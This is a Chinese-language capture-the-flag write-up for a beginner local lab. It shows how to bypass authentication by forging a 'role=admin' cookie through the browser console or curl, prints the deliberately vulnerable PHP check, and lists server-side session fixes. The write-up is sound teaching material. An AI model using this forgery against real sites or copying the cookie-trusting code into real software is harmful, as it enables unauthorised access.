# 题解：个人中心（越权 · Cookie 伪造）

> 对应课件 p20「Cookie / Session」、p35「越权」。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | Cookie 与会话、水平越权、可信边界 |
| 难度 | 1 |
| 端口 | 8085 |
| Flag 格式 | `flag{...}` |

一句话：服务器**直接信任** Cookie 里的 `role` 字段来决定你是不是管理员。

> 你说你是管理员？**我要验牌** —— 可这张牌是你自己写的。

## 二、启动环境

```bash
cd cookie-ctf
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8085/
```

## 三、手把手解题

### Step 1｜看看你身上带着什么

打开页面，是一个普通用户的个人中心。F12 → Application → Cookies：

```
role = guest
user = guest
```

页面提示：「看看你发给服务器的 Cookie 里写了什么。」

### Step 2｜改 Cookie（浏览器方式，最快）

控制台执行：

```javascript
document.cookie = "role=admin; path=/";
document.cookie = "user=admin; path=/";
location.reload();
```

刷新后出现管理员视图和 Flag：

> 验完了，**牌没有问题** —— 管理员请进。

### Step 3｜改 Cookie（Burp / curl 方式，更「渗透」）

```bash
curl -s "http://127.0.0.1:8085/" -H "Cookie: role=admin; user=admin"
```

一行命令就能拿 flag —— 因为服务端只看这个头。

### Step 4｜思考：这算「越权」还是「认证绕过」？

严格说是 **身份伪造（认证绕过）**：你没有窃取别人的会话，而是**直接声明了自己的身份**。
如果 `user` 字段能改成别人的用户名并看到他的数据，那就是**水平越权**。

## 四、为什么能成（原理）

后台代码：

```php
$role = $_COOKIE['role'] ?? 'guest';   // ← 全部信任
if ($role === 'admin') { echo ctf_flag(); }
```

同一个请求里，服务端拿到的 Cookie 就是一行普通字符串 —— **客户端想填什么就填什么**。

正确做法是把「身份」存在**服务端会话**里，Cookie 只带一个**不可猜测的 session id**：

```
Cookie: PHPSESSID=a9f3c2e1...      ← 换个值不会变成 admin，只会「会话不存在」
```

## 五、怎么修（防御）

- 角色、权限**只从服务端会话/数据库读**，绝不读 Cookie 里的业务字段
- Cookie 里不放明文身份；session id 用 `random_bytes` 生成，登录后重建
- Cookie 加 `HttpOnly` + `Secure` + `SameSite`
- 关键操作二次校验（比如改密码要旧密码）

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`；未注入则自动随机生成并缓存到 `/tmp/.web_ctf_flag`。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```
